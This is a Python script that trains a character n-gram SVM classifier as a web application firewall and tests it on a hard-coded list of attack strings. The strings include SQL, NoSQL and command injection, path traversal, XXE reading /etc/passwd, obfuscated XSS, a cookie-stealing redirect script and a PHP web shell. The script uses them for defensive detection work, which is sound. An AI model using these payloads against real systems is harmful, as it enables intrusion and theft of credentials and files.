import pandas as pd
import matplotlib.pyplot as plt
import numpy as np
from sklearn.metrics import accuracy_score , confusion_matrix , classification_report
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.svm import SVC
from sklearn.pipeline import make_pipeline
from sklearn.model_selection import train_test_split
import seaborn as sns
import pickle


#Load our dataset
waf_df = pd.read_csv('../EDA/waf.csv')
X = waf_df['Payloads'].to_numpy().astype(str)
y = waf_df['Types'].to_numpy().astype(str)
print(len(X))
print(len(y))

visualize_dataset = waf_df['Types'].value_counts()


# Visualize the dataset distribution
visualize_dataset.plot(kind='bar', title='Dataset distribution', color=['blue', 'red', 'green', 'yellow', 'purple','black', 'blue', 'blue', 'blue'])
plt.xlabel('Attack Type')
plt.ylabel('Count')
plt.xticks(rotation=45)  # Rotate labels for better visibility
plt.savefig('dataset_distribution.png', dpi=300, bbox_inches='tight')  # Save the figure



# Prepare traning and testing sets
trainX, testX, trainY, testY = train_test_split(X, y, test_size = 0.25, random_state = 42, stratify = y)

np.savez('dataset', trainX=trainX, testX=testX, trainY=trainY, testY=testY)
# #Add the best params
model = make_pipeline(TfidfVectorizer(input = 'content', lowercase = True, analyzer = 'char', max_features = 1024, ngram_range = (1, 2)), SVC(C = 10, kernel = 'rbf'))

# #Train model
model.fit(trainX, trainY)


# Predict on training data
y_train_pred = model.predict(trainX)
train_accuracy = accuracy_score(trainY, y_train_pred)

# Predict on test data
y_test_pred = model.predict(testX)
test_accuracy = accuracy_score(testY, y_test_pred)

# Print the results
print(f"Training Accuracy: {train_accuracy:.4f}")
print(f"Test Accuracy: {test_accuracy:.4f}")

cm = confusion_matrix(testY, y_test_pred)

print('Confusion matrix\n\n', cm)
print('\nTrue Positives(TP) = ', cm[0,0])
print('\nTrue Negatives(TN) = ', cm[1,1])
print('\nFalse Positives(FP) = ', cm[0,1])
print('\nFalse Negatives(FN) = ', cm[1,0])


labels = list(set(testY))  # Get unique attack type labels
cm_matrix = pd.DataFrame(data=cm, columns=labels, index=labels)


# Confusion matrix heatmap
plt.figure(figsize=(8, 6))
sns.heatmap(cm_matrix, annot=True, fmt='d', cmap='YlGnBu')
plt.title('Confusion Matrix')
plt.xlabel('Predicted Label')
plt.ylabel('True Label')
plt.savefig('Confusion matrix.png', dpi=300, bbox_inches='tight')  # Save the figure


print(classification_report(testY, y_test_pred))

TP = cm[0,0]
TN = cm[1,1]
FP = cm[0,1]
FN = cm[1,0]

#print the classification accuracy
classification_accuracy = (TP + TN) / float(TP + TN + FP + FN)
print('Classification accuracy : {0:0.4f}'.format(classification_accuracy))


#print the classification error
classification_error = (FP + FN) / float(TP + TN + FP + FN)
print('Classification error : {0:0.4f}'.format(classification_error))

#print the precision
precision = TP / float(TP + FP)
print('Precision : {0:0.4f}'.format(precision))

#print recall
recall = TP / float(TP + FN)
print('Recall or Sensitivity : {0:0.4f}'.format(recall))

#print f1 score
f1 = 2*precision*recall / float(precision + recall)
print('F1 Score : {0:0.4f}'.format(f1))


filename = 'waf_model.sav'
pickle.dump(model, open(filename, 'wb'))


#Load saved model
loaded_model = pickle.load(open('waf_model.sav', 'rb'))


#List of payloads to test waf model
parameters = [
  "%3f%0dshivang:crlf=injection", "query=home&homeprice=4300","#shivang{{5*7}}","<pre><!--#exec cmd=\"id\"--></pre>","../\\\\\\../\\\\\\../\\\\\\etc/passwd%00%00", "query=shivang)))' OR 1=2#-- -", 
              "something;|id|", "{$gt: ''}",
              
              "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
              
              "<script>window.location='dummy/catch.php?cookie='+document.cookie</script>",
              
              "%3Cscript%3E%0Awindow.location%3D%27dummy%2Fcatch.php%3Fcookie%3D%27%2Bdocument.cookie%0A%3C%2Fscript%3E",
              
              "%2c(select%20*%20from%20(select(sleep(10)))a)",
              
              "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"
              
              '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><test>&xxe;</test>''',
              
              "'Union select * from (select 200 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as email,'123' as 'password' ,'admin' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2024-10-02 17:54:05.110 +00:00' as 'createdAt', '2024-10-02 18:53:00.980 +00:00' as 'updatedAt', null as 'deletedAt') --",
              
              "<?php echo passthru($_GET['cmd']); ?>",
              
              ";sleep(10)",
              
              "xsacdsac;ping -c 11 127.0.0.1"    
                  
              ]
temp_array = []
#Function acts as backend for payload detection

def waf_check(parameters, temp_array):
  for detect in range(len(parameters)):
    temp_array.append(parameters[detect])
    prediction = loaded_model.predict(temp_array)
    if "valid" in prediction:
      print("\n[+] You can access our site!\n")
    else:
      print("[!] Attack detected!...Hold your horses!")
      for result in prediction:
        print(f"[~] Attack type", result)
    temp_array = []
    
    
    
#Call the api
waf_check(parameters, temp_array)